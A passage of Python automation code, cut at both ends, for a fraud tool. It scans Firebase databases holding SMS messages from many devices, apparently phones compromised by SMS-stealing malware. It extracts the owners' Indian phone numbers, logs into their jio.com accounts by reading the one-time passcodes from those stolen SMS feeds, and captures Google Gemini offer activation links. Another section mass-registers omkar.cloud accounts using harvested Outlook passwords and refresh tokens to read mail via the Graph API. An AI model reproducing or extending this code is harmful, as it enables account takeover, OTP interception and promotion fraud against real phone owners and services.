                    if attempt == 2: raise req_err
                    await asyncio.sleep(2)
            
            # 2. Fetch the messages
            data = None
            for attempt in range(3):
                try:
                    async with state.http_session.get(f"{fb_url}/messages.json", timeout=90) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            break
                except Exception as req_err:
                    if attempt == 2: raise req_err
                    await asyncio.sleep(2)
            if not data: return local_map
            
            online_count = 0
            offline_count = 0
            offline_alive = 0
            jio_tagged = 0
            fallback_found = 0
            
            for device_id, msgs in data.items():
                if not isinstance(msgs, dict): continue
                
                is_online = device_id in online_devices
                
                if not is_online:
                    if not deep_scan:
                        offline_count += 1
                        continue
                    # Deep scan: check if the device received any SMS in the last 24 hours
                    latest_key = max((int(k) for k in msgs.keys() if str(k).isdigit()), default=0)
                    if latest_key < cutoff_ms:
                        offline_count += 1
                        continue
                    # This offline device is still alive!
                    offline_alive += 1
                else:
                    online_count += 1
                    
                sorted_msgs = sorted(msgs.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
                if not sorted_msgs:
                    continue
                
                found = False
                
                # Pass 1: Look for messages that mention Jio (sender or body) and contain a phone
                for msg_id, msg_data in sorted_msgs:
                    if not isinstance(msg_data, dict): continue
                    if is_jio_message(msg_data):
                        phone = extract_phone_from_text(msg_data.get("message", ""))
                        if phone:
                            local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online" if is_online else "offline" }
                            jio_tagged += 1
                            found = True
                            break
                
                # Pass 2: Fallback — scan ALL messages for any Indian mobile number
                if not found:
                    for msg_id, msg_data in sorted_msgs:
                        if not isinstance(msg_data, dict): continue
                        phone = extract_phone_from_text(msg_data.get("message", ""))
                        if phone:
                            local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online" if is_online else "offline" }
                            fallback_found += 1
                            break
            
            deep_label = f", Offline-Alive (5d): {offline_alive}" if deep_scan else ""
            await emit_log(f"[{fb_url.split('/')[2].split('.')[0]}] Online: {online_count}, Offline: {offline_count}{deep_label} | Jio-tagged: {jio_tagged}, Fallback: {fallback_found}", "info")
        except asyncio.TimeoutError:
            await emit_log(f"Error fetching from {fb_url}: Connection timed out (database might be too large)", "error")
        except Exception as e:
            err_msg = str(e) or type(e).__name__
            await emit_log(f"Error fetching from {fb_url}: {err_msg}", "error")
        return local_map
    
    # Scan ALL Firebase URLs in parallel
    await emit_log(f"⚡ Scanning {len(urls)} Firebase databases in parallel...", "info")
    results = await asyncio.gather(*[scan_single_fb(fb_url) for fb_url in urls])
    
    for local_map in results:
        device_map.update(local_map)
    
    mode_label = "ONLINE + recently-active OFFLINE" if deep_scan else "ONLINE"
    await emit_log(f"Mapped {len(device_map)} phone numbers from {mode_label} Firebase devices!", "success")
    return device_map


async def poll_for_otp(fb_url, device_id, known_msg_keys, timeout=45, poll_interval=1.2):
    """Poll Firebase directly for new OTP messages on a specific device.
    
    This replaces the unreliable SSE approach. After clicking 'Generate OTP',
    we poll /messages/{device_id}.json every 1.2s and look for any NEW
    message (not in known_msg_keys) containing a 6-digit code.
    
    Returns the OTP string or raises TimeoutError.
    """
    deadline = asyncio.get_event_loop().time() + timeout
    
    async def fetch_single_msg(key):
        """Fetch a single message payload and return (key, data) or None."""
        try:
            async with state.http_session.get(f"{fb_url}/messages/{device_id}/{key}.json", timeout=10) as msg_resp:
                if msg_resp.status != 200:
                    return None
                msg_data = await msg_resp.json()
                if not isinstance(msg_data, dict):
                    return None
                return (key, msg_data)
        except Exception:
            return None
    
    while asyncio.get_event_loop().time() < deadline:
        try:
            # Fetch just the keys (shallow=true) to find new messages
            async with state.http_session.get(f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=10) as resp:
                if resp.status != 200:
                    await asyncio.sleep(poll_interval)
                    continue
                shallow_data = await resp.json()
                if not shallow_data or not isinstance(shallow_data, dict):
                    await asyncio.sleep(poll_interval)
                    continue
                
                # Find new message keys
                new_keys = [k for k in shallow_data.keys() if k not in known_msg_keys]
                if not new_keys:
                    await asyncio.sleep(poll_interval)
                    continue
                
                # Fetch all new message payloads concurrently
                results = await asyncio.gather(*[fetch_single_msg(key) for key in new_keys])
                
                successfully_checked = set()
                for result in results:
                    if result is None:
                        # Don't add to known_keys - retry on next cycle
                        continue
                    key, msg_data = result
                    
                    # Check multiple possible field names for SMS text
                    text = ""
                    for field in ("message", "body", "text", "content", "smsBody"):
                        val = msg_data.get(field, "")
                        if val and isinstance(val, str):
                            text = val
                            break
                    # Fallback: scan entire JSON string
                    if not text:
                        text = str(msg_data)
                    
                    normalized = normalize_digits(text)
                    otp_match = re.search(r'(?<!\d)(\d{6})(?!\d)', normalized)
                    if otp_match:
                        otp = otp_match.group(1)
                        await emit_log(f"🔔 POLL [{device_id[:8]}] OTP detected: {otp} (msg {key})", "success")
                        return otp
                    
                    successfully_checked.add(key)
                
                # Only mark successfully-checked non-OTP messages as known
                known_msg_keys.update(successfully_checked)
                
        except Exception as e:
            await emit_log(f"Poll [{device_id[:8]}] error: {e}", "warning")
        
        await asyncio.sleep(poll_interval)
    
    raise asyncio.TimeoutError(f"No OTP found after {timeout}s of polling")


async def get_device_message_keys(fb_url, device_id):
    """Get the current set of message keys for a device (snapshot before OTP request)."""
    try:
        async with state.http_session.get(f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=15) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict):
                    return set(data.keys())
    except Exception:
        pass
    return set()

class RetryableJioError(Exception):
    """Raised when jio.com shows 'Something went wrong' — device should be retried after a delay."""
    pass

async def process_firebase_number(device_id, phone, fb_url, speed_delay, attempt=1, online_status="unknown"):
    context = None
    page = None
    otp_wait_time = "N/A"
    slot_released = False
    slot_timer = None
    used_file = os.path.join(DATA_DIR, "used_firebase_devices.txt")
    try:
        max_attempts = 3
        order_id = str(uuid.uuid4())[:8]
        clean_phone = phone[2:] if (phone.startswith("91") and len(phone) > 10) else phone
        attempt_label = f" (attempt {attempt}/{max_attempts})" if attempt > 1 else ""
        order = {
            "id": order_id, "aid": device_id, "phone": "+91" + clean_phone, "provider": "FirebaseDirect",
            "status": "checking_carrier", "carrier": "Jio", "otp": None,
            "timestamp": time.time(), "events": []
        }
        
        order_event(order, f"Discovered on Firebase Device: {device_id}{attempt_label}")
        await emit_order(order)
        
        if attempt == 1:
            state.stats["fetched"] += 1
            record_analytics_event("FirebaseDirect", "fetched")
            state.stats["jio"] += 1
            record_analytics_event("FirebaseDirect", "jio")
            await emit_stats()
        
        order["status"] = "waiting_otp"
        await emit_order(order)
        
        if not state.browser: raise Exception("Browser not initialized")
        order["status"] = "logging_in"
        order_event(order, f"Opening browser and navigating to jio.com...{attempt_label}")
        await emit_order(order)
        
        profile_path = os.path.join(PROFILES_DIR, f"session_{order_id}")
        os.makedirs(profile_path, exist_ok=True)
        
        context = await state.browser.new_context(user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        page = await context.new_page()
        
        # Block images to speed up page load
        await page.route("**/*.{png,jpg,jpeg,gif,svg,webp,ico}", lambda route: route.abort())
        await page.route("**/images/**", lambda route: route.abort())
        
        order["_context"] = context
        order["_page"] = page
        
        await page.goto("https://www.jio.com/selfcare/login/", wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(0.5)
        
        order_event(order, f"Typing phone number: {clean_phone}")
        await asyncio.sleep(0.3)
        await page.locator('[data-testid="numberField"]').fill(clean_phone)
        await asyncio.sleep(0.3)
        
        order_event(order, "Clicking Generate OTP...")
             
        # Lock ensures snapshot→click is atomic (no other browser can interleave)
        # Pacing is handled by BROWSER_LAUNCH_INTERVAL in the dispatch loop
        async with _otp_lock():
            known_msg_keys = await get_device_message_keys(fb_url, device_id)
            await emit_log(f"[{phone}] Snapshot: {len(known_msg_keys)} existing msgs for {device_id[:8]}", "info")
            await page.locator('[data-testid="generateOTPButton"]').click(timeout=10000)
        
        await emit_log(f"[{phone}] Clicked Generate OTP on jio.com", "info")
        
        # Check for OTP screen or instant errors (wait up to 5s, checking every 100ms)
        max_wait_iters = int(50 * speed_delay)
        otp_screen_status = None
        
        for _ in range(max_wait_iters):
            try:
                status = await page.evaluate("""() => {
                    const body = document.body.innerText || '';
                    const html = document.body.innerHTML || '';
                    if (html.includes('basic-input-testInput-code-block-0') || body.includes('Verify phone number')) return 'success';
                    if (body.toLowerCase().includes('non-jio')) return 'non_jio';
                    if (body.includes('exceeded the maximum attempts')) return 'rate_limit';
                    if (body.toLowerCase().includes('something went wrong')) return 'something_wrong';
                    return null;
                }""")
                if status:
                    otp_screen_status = status
                    break
            except Exception:
                pass
            await asyncio.sleep(0.1)
                
        if otp_screen_status == "non_jio":
            if attempt > 1:
                raise RetryableJioError("Server issue falsely reporting Non-Jio")
            else:
                raise Exception("Non-Jio number detected")
        elif otp_screen_status == "rate_limit":
            raise Exception("Jio IP Rate Limited")
        elif otp_screen_status == "something_wrong":
            raise RetryableJioError("Something went wrong on jio.com")
        elif not otp_screen_status:
            raise RetryableJioError("Jio stuck loading after Generate OTP")
        
        order["status"] = "waiting_otp"
        order_event(order, "Polling Firebase for OTP...")
        await emit_order(order)
        
        try:
            poll_start = time.time()
            cancel_wait = config.get("timing", {}).get("cancel_wait_seconds", 45)
            
            # Pipeline: release the browser slot after 7s so the next account can start
            async def release_slot_after_delay():
                nonlocal slot_released
                await asyncio.sleep(7)
                if not slot_released:
                    slot_released = True
                    async with _jio_lock():
                        state.jio_count = max(0, state.jio_count - 1)
                    await emit_log(f"⏩ [{phone}] OTP taking >7s — releasing slot for next account", "info")
            
            slot_timer = asyncio.create_task(release_slot_after_delay())
            
            otp_code = await poll_for_otp(fb_url, device_id, known_msg_keys, timeout=cancel_wait)
            otp_wait_time = round(time.time() - poll_start, 1)
            
            # If OTP arrived before 7s, release the slot immediately
            if slot_timer:
                slot_timer.cancel()
            if not slot_released:
                slot_released = True
                async with _jio_lock():
                    state.jio_count = max(0, state.jio_count - 1)
                await emit_log(f"⏩ [{phone}] OTP received fast (<7s) — releasing slot now", "info")
                
        except asyncio.TimeoutError:
            if slot_timer: slot_timer.cancel()
            raise Exception("Timed out waiting for Firebase OTP")
            
        order["otp"] = otp_code
        order["status"] = "otp_received"
        order_event(order, f"OTP received: {otp_code} ({otp_wait_time}s)")
        await emit_order(order)
        await emit_log(f"✅ Firebase OTP for {phone}: {otp_code} (waited {otp_wait_time}s)", "success")
        
        # Record OTP wait time for dashboard
        if attempt == 1:
            state.stats["otp_times"].append(otp_wait_time)
            state.stats["otp"] += 1
            record_analytics_event("FirebaseDirect", "otp")
            await emit_stats()
        
        order["status"] = "logging_in"
        await asyncio.sleep(1 * speed_delay)
        for i, digit in enumerate(otp_code[:6]):
            await page.locator(f'#basic-input-testInput-code-block-{i}').fill(digit)
            await asyncio.sleep(0.1)
        await asyncio.sleep(1 * speed_delay)
        await page.locator('button:has-text("Submit")').click()
        
        # Check for infinite loading spinner after OTP submit (wait up to 5s, checking every 100ms)
        submit_wait_iters = int(50 * speed_delay)
        modal_disappeared = False
        for _ in range(submit_wait_iters):
            try:
                gone = await page.evaluate("""() => {
                    const body = document.body.innerText || '';
                    return !body.includes('Verify phone number') && !body.includes('Submit');
                }""")
                if gone:
                    modal_disappeared = True
                    break
            except Exception:
                pass
            await asyncio.sleep(0.1)
                
        if not modal_disappeared:
            raise RetryableJioError("Jio stuck loading after OTP Submit")

        
        if attempt == 1:
            state.stats["login"] += 1
            record_analytics_event("FirebaseDirect", "login")
            await emit_stats()
        
        # Extraction
        order_event(order, "Looking for Gemini offer banner...")
        await emit_order(order)
        
        captured_url = []
        async def handle_route(route):
            req_url = route.request.url
            if "serviceactivation.google.com" in req_url or "accounts.google.com" in req_url or "oauth2" in req_url.lower():
                captured_url.append(req_url)
                try: await route.abort()
                except: pass
            else:
                try: await route.continue_()
                except: pass
                
        await context.route("**/*", handle_route)
        
        banner_el = None
        el_id = None
        alt_el_found = None
        
        for i in range(45):
            # Single JS call to check both selectors at once (avoids 2 roundtrips per loop)
            try:
                found_type = await page.evaluate("""() => {
                    if (document.querySelector('#imageNotification')) return 'gemini';
                    const alt = document.querySelector('section[class*="notificationContainer"]');
                    if (alt && alt.innerText && alt.innerText.trim().length > 10) return 'alt';
                    return null;
                }""")
            except Exception:
                # Page navigated away (likely to Google) — check if we captured the URL
                if captured_url:
                    break
                found_type = None
            
            if found_type == 'gemini':
                banner_el = await page.query_selector('#imageNotification')
                el_id = "imageNotification"
                break
            elif found_type == 'alt' and not alt_el_found:
                alt_el_found = await page.query_selector('section[class*="notificationContainer"]')
            
            # If we've found an alternative offer, wait up to 10 seconds for the Gemini banner
            # in case it's delayed. If the Jio offer always comes first, 10s is enough.
            if i >= 10 and alt_el_found:
                banner_el = alt_el_found
                break
                
            await asyncio.sleep(1)
            
        if not banner_el and alt_el_found:
            banner_el = alt_el_found
        
        # If URL was already captured during navigation (page redirected automatically), skip banner click
        if captured_url:
            pass  # Fall through to the captured_url handler below
        elif not banner_el:
            raise Exception("No offer banner found after 45s")
        elif el_id == "imageNotification":
            order_event(order, "Found Gemini banner! Clicking...")
            await page.click('#imageNotification')
        else:
            # It's an alternative offer (YouTube Premium, Amazon Prime, etc.)
            alt_els = await page.query_selector_all('section[class*="notificationContainer"]')
            texts = []
            for el in alt_els:
                t = await el.inner_text()
                if t and len(t.strip()) > 10:
                    texts.append(" | ".join([line.strip() for line in t.split('\n') if line.strip()]))
            clean_text = " || ".join(texts) if texts else "Unknown Alternative Offer"
            
            await emit_log(f"ℹ️ [{phone}] Alternative Offer Found: {clean_text}", "info")
            order_event(order, f"Alternative Offer: {clean_text}")
            await emit_order(order)
            
            with open(os.path.join(DATA_DIR, "alternative_offers.csv"), "a", newline="") as f:
                csv.writer(f).writerow([fb_url, device_id, phone, clean_text])
                
            order["status"] = "cancelled"
            await emit_order(order)
            # Mark device as used (alternative offer is a final outcome)
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()
            if context:
                await context.close()
            order["_context"] = None
            return
        
        for _ in range(15):
            if captured_url: break
            await asyncio.sleep(1)
            
        if captured_url:
            target_link = next((url for url in captured_url if "serviceactivation.google.com" in url), captured_url[0])
            with open(SUCCESS_CSV, "a", newline="") as f:
                csv.writer(f).writerow([fb_url, device_id, phone, target_link, online_status, otp_wait_time])
            
            # Mark device as used (success is a final outcome)
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()
            
            with open(os.path.join(DATA_DIR, "links.txt"), "a") as f:
                f.write(f"{phone} | {target_link}\n")
                
            order["status"] = "logged_in"
            order_event(order, "✅ Link extracted & saved to CSV/links.txt!")
            await emit_order(order)
            os.system("afplay /System/Library/Sounds/Ping.aiff &")
            await emit_log(f"🎉 [{phone}] Gemini Link Saved!", "success")
            await asyncio.sleep(2)
            await context.close()
            order["_context"] = None
            return
        else:
            raise Exception("Clicked banner but redirect not caught")
    
    except RetryableJioError as e:
        # "Something went wrong" — close browser immediately, schedule retry
        if context:
            try: await context.close()
            except: pass
            
        # Small 5-second global wait to relieve IP pressure without freezing the app
        state.global_jio_pause_until = time.time() + 5
        
        if attempt < max_attempts:
            retry_delay = random.randint(120, 180)  # 2-3 minutes
            await emit_log(f"⚠️ [{phone}] Something went wrong on jio.com — pausing queue for 30s, retrying this in {retry_delay}s (attempt {attempt}/{max_attempts})", "warning")
            order["status"] = "cancelled"
            order_event(order, f"Something went wrong — retry scheduled in {retry_delay}s")
            await emit_order(order)
            # Schedule the retry
            asyncio.create_task(_delayed_retry(device_id, phone, fb_url, speed_delay, attempt + 1, retry_delay, online_status))
        else:
            await emit_log(f"❌ [{phone}] Something went wrong on jio.com — all {max_attempts} attempts exhausted", "error")
            order["status"] = "cancelled"
            order_event(order, f"Something went wrong — gave up after {max_attempts} attempts")
            await emit_order(order)
            with open(FAILED_CSV, "a", newline="") as f:
                csv.writer(f).writerow([fb_url, device_id, phone, "Something went wrong (all retries exhausted)", online_status, otp_wait_time])
            # Mark device as used (all retries exhausted is a final outcome)
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()
        return
            
    except Exception as e:
        err_msg = str(e).split('\n')[0]
        order["status"] = "cancelled"
        order_event(order, f"Firebase Error: {err_msg}")
        await emit_order(order)
        await emit_log(f"[{phone}] Error: {err_msg}", "error")
        with open(FAILED_CSV, "a", newline="") as f:
            csv.writer(f).writerow([fb_url, device_id, phone, err_msg, online_status, otp_wait_time])
        # Mark device as used (non-retryable error is a final outcome)
        with open(used_file, "a") as f:
            f.write(device_id + "\n")
        state.batch_checked += 1
        await emit_batch_progress()
            
        if context:
            try: await context.close()
            except: pass
    finally:
        if slot_timer:
            slot_timer.cancel()
        if not slot_released:
            async with _jio_lock():
                state.jio_count = max(0, state.jio_count - 1)


def _jio_lock():
    """Lazy-init asyncio.Lock for jio_count safety."""
    if state.jio_count_lock is None:
        state.jio_count_lock = asyncio.Lock()
    return state.jio_count_lock

def _otp_lock():
    """Lazy-init asyncio.Lock for OTP click throttling."""
    if state.otp_click_lock is None:
        state.otp_click_lock = asyncio.Lock()
    return state.otp_click_lock


async def _delayed_retry(device_id, phone, fb_url, speed_delay, attempt, delay_seconds, online_status):
    """Wait for delay_seconds, then re-run process_firebase_number with incremented attempt."""
    await asyncio.sleep(delay_seconds)
    
    # Respect the browser launch stagger so retries don't jump the queue
    elapsed = time.time() - state.last_browser_launch_time
    if elapsed < BROWSER_LAUNCH_INTERVAL:
        wait_time = BROWSER_LAUNCH_INTERVAL - elapsed
        await asyncio.sleep(wait_time)
    state.last_browser_launch_time = time.time()
    
    async with _jio_lock():
        state.jio_count += 1
    
    await emit_log(f"🔄 [{phone}] Retrying now (attempt {attempt})...", "info")
    await process_firebase_number(device_id, phone, fb_url, speed_delay, attempt=attempt, online_status=online_status)


async def firebase_sniper_worker(speed_delay, deep_scan=False):
    init_csvs()
    device_map = await fetch_initial_mapping(deep_scan=deep_scan)
    if not device_map: return
    
    used_file = os.path.join(DATA_DIR, "used_firebase_devices.txt")
    used_devices = set()
    if os.path.exists(used_file):
        with open(used_file, "r") as f:
            used_devices = set(line.strip() for line in f if line.strip())
            
    available_devices = [k for k in device_map.keys() if k not in used_devices]
    
    await emit_log(f"Firebase: {len(available_devices)} devices available (using HTTP polling for OTP)", "info")
    
    state.batch_total = len(available_devices)
    state.batch_checked = 0
    state.batch_start_time = time.time()
    await emit_batch_progress()
        
    while not state.stop_event.is_set() and available_devices:
        # Note: jio_count / target_count no longer gates launches here.
        # OTP_CLICK_INTERVAL (OTP Delay) is the sole pacing mechanism.
            
        if time.time() < getattr(state, "global_jio_pause_until", 0):
            await asyncio.sleep(2)
            continue
            
        elapsed = time.time() - state.last_browser_launch_time
        if elapsed < BROWSER_LAUNCH_INTERVAL:
            wait_time = BROWSER_LAUNCH_INTERVAL - elapsed
            await emit_log(f"Staggering next browser launch by {round(wait_time, 1)}s...", "info")
            await asyncio.sleep(wait_time)
            
        # Update the launch time *outside* the OTP lock so they don't block each other
        state.last_browser_launch_time = time.time()
            
        device_id = available_devices.pop(0)
        # Don't write to used_firebase_devices.txt here — do it after we know the outcome
        # (moved to process_firebase_number success/fail handlers)
            
        phone = device_map[device_id]["phone"]
        fb_url = device_map[device_id]["url"]
        online_status = device_map[device_id].get("status", "unknown")
        
        async with _jio_lock():
            state.jio_count += 1
        asyncio.create_task(process_firebase_number(device_id, phone, fb_url, speed_delay, online_status=online_status))
        await asyncio.sleep(1)
    
    # All devices dispatched — wait for in-flight tasks to finish
    await emit_log(f"All {len(device_map)} Firebase devices dispatched. Waiting for in-flight tasks...", "info")
    while state.jio_count > 0 and not state.stop_event.is_set():
        await asyncio.sleep(2)
    
    await emit_log("✅ Firebase Direct completed — all devices processed!", "success")

# ─── Sniper Workers ──────────────────────────────────────────────────────────
async def sniper_worker(p_name, speed_delay):
    delay = config["providers"].get(p_name, {}).get("delay", 3) * speed_delay
    
    while not state.stop_event.is_set():
        if state.jio_count >= state.target_count:
            await asyncio.sleep(delay)
            continue
            
        state.jio_count += 1
        try:
            result = await buy_number(p_name)
            if result["status"] == "success":
                asyncio.create_task(process_number(p_name, result["aid"], result["phone"]))
            else:
                state.jio_count -= 1
        except:
            state.jio_count -= 1
        await asyncio.sleep(delay)

# ─── Socket.IO Events ────────────────────────────────────────────────────────
@sio.on('connect')
async def on_connect(sid, environ):
    await emit_log("Dashboard connected", "info")
    
    # Sync current state to prevent "factory reset" on browser reload
    if state.is_sniping:
        await sio.emit('sniping_started', to=sid)
    
    await emit_stats()
    await emit_batch_progress()
    
    for order in state.orders.values():
        await sio.emit("number_update", safe_order(order), to=sid)
        
    # Start system monitor if not running
    if state.system_monitor_task is None or state.system_monitor_task.done():
        state.system_monitor_task = asyncio.create_task(system_monitor_loop())

@sio.on('get_balances')
async def on_get_balances(sid):
    if not state.http_session:
        state.http_session = aiohttp.ClientSession()
    balances = {}
    for p in config["providers"]:
        bal = await get_balance(p)
        balances[p] = bal
    await sio.emit("balance_update", balances, to=sid)

@sio.on('start_sniping')
async def on_start_sniping(sid, data):
    if state.is_sniping:
        await emit_log("Already sniping!", "warn")
        return
    
    providers = data.get("providers", list(config["providers"].keys()))
    state.target_count = data.get("batch_size", 5)
    speed = data.get("speed", "normal")
    speed_delay = SPEED_MAP.get(speed, 1.0)
    
    state.is_sniping = True
    state.stop_event = asyncio.Event()
    state.jio_count = 0
    state.stats = {"fetched": 0, "jio": 0, "otp": 0, "login": 0, "otp_times": []}
    
    # Record session start
    analytics.setdefault("sessions", []).append({
        "start": time.time(), "providers": providers, "target": state.target_count
    })
    
    if not state.http_session:
        state.http_session = aiohttp.ClientSession()
        
    if "otp_delay" in data:
        global BROWSER_LAUNCH_INTERVAL, OTP_CLICK_INTERVAL
        BROWSER_LAUNCH_INTERVAL = int(data["otp_delay"])
        OTP_CLICK_INTERVAL = int(data["otp_delay"])
    
    os.makedirs(PROFILES_DIR, exist_ok=True)
    try:
        from playwright.async_api import async_playwright
        headless_val = data.get("headless")
        if headless_val is None:
            is_headless = str(os.environ.get("HEADLESS_MODE", "False")).lower() == "true"
        else:
            is_headless = str(headless_val).lower() == "true"
        
        # Clean up existing browser so new headless setting applies and RAM is freed
        if state.browser:
            try: await state.browser.close()
            except: pass
            state.browser = None
        if state.pw:
            try: await state.pw.stop()
            except: pass
            state.pw = None
            
        state.pw = await async_playwright().start()
        state.browser = await state.pw.chromium.launch(headless=is_headless)
        mode_str = "Headless Mode" if is_headless else "Visible GUI Mode"
        await emit_log(f"Browser launched in {mode_str}", "info")
    except Exception as e:
        await emit_log(f"Browser launch failed: {e}. OTP-only mode.", "warn")
    
    await sio.emit("sniping_started")
    await emit_log(f"🚀 Sniping started! Providers: {', '.join(providers)} | Target: {state.target_count}", "success")
    state.sniper_tasks = []
    for p in providers:
        if p == "FirebaseDirect":
            deep_scan = data.get("deep_scan", False)
            state.sniper_tasks.append(asyncio.create_task(firebase_sniper_worker(speed_delay, deep_scan=deep_scan)))
        elif p in config["providers"]:
            state.sniper_tasks.append(asyncio.create_task(sniper_worker(p, speed_delay)))

@sio.on('stop_sniping')
async def on_stop_sniping(sid):
    if state.stop_event:
        state.stop_event.set()
    await emit_log("⏳ Gracefully stopping... letting active tasks finish.", "warn")
    
    # Wait for tasks to finish in background
    async def monitor_tasks():
        if state.sniper_tasks:
            await asyncio.gather(*state.sniper_tasks, return_exceptions=True)
        state.sniper_tasks = []
        state.is_sniping = False
        save_analytics()
        await sio.emit("sniping_stopped")
        await emit_log("⏹ All tasks completed. Sniping stopped.", "warn")
        
    asyncio.create_task(monitor_tasks())

@sio.on('force_stop_sniping')
async def on_force_stop_sniping(sid):
    if state.stop_event:
        state.stop_event.set()
    for task in state.sniper_tasks:
        task.cancel()
    state.sniper_tasks = []
    state.is_sniping = False
    save_analytics()
    await sio.emit("sniping_stopped")
    await emit_log("✖ FORCE STOPPED. All tasks killed instantly.", "error")

@sio.on('kill_zombie_browsers')
async def on_kill_zombie_browsers(sid):
    await emit_log("🧹 Killing zombie Google Chrome for Testing processes...", "warn")
    os.system('pkill -f "Google Chrome for Testing" >/dev/null 2>&1 || true')
    await emit_log("✅ Zombie browsers cleared!", "success")

@sio.on('cancel_number')
async def on_cancel_number(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    ctx = order.get("_context")
    if ctx:
        try:
            await ctx.close()
        except:
            pass
        order["_context"] = None
    order_event(order, "Manually cancelled by user")
    asyncio.create_task(cancel_order(order))
    await emit_log(f"Cancelling {order['phone']}...", "warn")

@sio.on('request_new_otp')
async def on_request_new_otp(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    order["status"] = "waiting_otp"
    order["otp"] = None
    order_event(order, "Re-polling for new OTP...")
    await emit_order(order)
    await emit_log(f"Re-polling OTP for {order['phone']}...", "info")
    asyncio.create_task(handle_jio_number(order))

@sio.on('force_cancel')
async def on_force_cancel(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    ctx = order.get("_context")
    if ctx:
        try:
            await ctx.close()
        except:
            pass
        order["_context"] = None
    order_event(order, "Force cancelled — skipping wait timer")
    order["status"] = "cancelling"
    await emit_order(order)
    # Force cancel immediately (no 120s wait)
    status = await cancel_api_number(order["provider"], order["aid"])
    order["status"] = "cancelled"
    order_event(order, f"Force cancel result: {status}")
    await emit_order(order)
    await emit_log(f"[{order['phone']}] Force cancelled: {status}", "warn")
    await asyncio.sleep(3)
    if order_id in state.orders:
        del state.orders[order_id]
        await sio.emit("number_remove", {"id": order_id})

@sio.on('get_orders')
async def on_get_orders(sid):
    for order in state.orders.values():
        await sio.emit("number_update", safe_order(order), to=sid)

@sio.on('get_settings')
async def on_get_settings(sid):
    await sio.emit("settings_data", config, to=sid)

@sio.on('save_settings')
async def on_save_settings(sid, data):
    global config
    config.update(data)
    save_config(config)
    await emit_log("⚙️ Settings saved!", "success")
    await sio.emit("settings_saved")

@sio.on('get_analytics')
async def on_get_analytics(sid):
    await sio.emit("analytics_data", analytics, to=sid)

@sio.on('get_order_detail')
async def on_get_order_detail(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if order:
        await sio.emit("order_detail", safe_order(order), to=sid)

@sio.on('stop_omkar_generation')
async def on_stop_omkar_generation(sid):
    state.omkar_gen_stop = True
    await sio.emit('omkar_gen_log', {'msg': 'Stopping generation after current step...', 'level': 'warn'}, to=sid)

@sio.on('generate_omkar_keys')
async def on_generate_omkar_keys(sid, data):
    accounts = data.get('accounts', [])
    if not accounts:
        return
    state.omkar_gen_stop = False
    await sio.emit('omkar_gen_log', {'msg': f'Starting automation for {len(accounts)} accounts...', 'level': 'info'}, to=sid)
    asyncio.create_task(process_omkar_generation(sid, accounts))


async def _process_single_omkar_account(sid, account_line, omkar_txt_path, sem, stagger_delay=0):
    # Stagger launches so we don't slam Omkar's servers all at once
    if stagger_delay > 0:
        await asyncio.sleep(stagger_delay)
    async with sem:

        if state.omkar_gen_stop:
            await sio.emit('omkar_gen_log', {'msg': 'Generation stopped by user.', 'level': 'warn'}, to=sid)
            return
            
        parts = account_line.split('|')
        if len(parts) < 4:
            await sio.emit('omkar_gen_log', {'msg': f'Invalid format: {account_line}', 'level': 'error'}, to=sid)
            return
            
        raw_email, password, refresh_token, client_id = [p.strip() for p in parts[:4]]
        # Strip numbering like "237. " from the beginning of the email string
        email = re.sub(r'^\d+\.\s*', '', raw_email)
        
        name_part = email.split('@')[0]
        # Make name nicely spaced and capitalized if mixed case (e.g., RandirMaeqi -> Randir Maeqi)
        name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_part).title()
        
        # Use the Outlook password as the Omkar password, but ensure it meets Omkar's special character requirement!
        omkar_pass = password
        if not re.search(r'[!@#$%^&*]', omkar_pass):
            omkar_pass += "!"
            
        await sio.emit('omkar_gen_log', {'msg': f'Processing {email}...', 'level': 'info'}, to=sid)
        
        context = None
        try:
            if not state.pw:
                from playwright.async_api import async_playwright
                state.pw = await async_playwright().start()
                state.browser = await state.pw.chromium.launch(headless=False)
            
            context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            # Step 1: Sign up
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Navigating to Omkar signup...', 'level': 'info'}, to=sid)
            await page.goto("https://www.omkar.cloud/auth/sign-up", wait_until="networkidle")
            await asyncio.sleep(2) # Give React time to hydrate
            
            await page.locator('input[name="name"]').press_sequentially(name, delay=30)
            await page.locator('input[type="email"]').press_sequentially(email, delay=30)
            await page.locator('input[type="password"]').press_sequentially(omkar_pass, delay=30)
            
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Submitting signup form...', 'level': 'info'}, to=sid)
            await page.locator('button:has-text("Submit")').click(force=True)
            await asyncio.sleep(5)
            
            # Step 2: Graph API Email Fetch
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Requesting Graph API access token...', 'level': 'info'}, to=sid)
            
            token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            token_data = {
                "client_id": client_id,
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": "Mail.Read"
            }
            
            access_token = None
            async with state.http_session.post(token_url, data=token_data) as resp:
                if resp.status != 200:
                    err = await resp.text()
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Failed to get access token: {err[:100]}', 'level': 'error'}, to=sid)
                    raise Exception("Graph API Token Error")
                res_data = await resp.json()
                access_token = res_data.get("access_token")
                
            if not access_token:
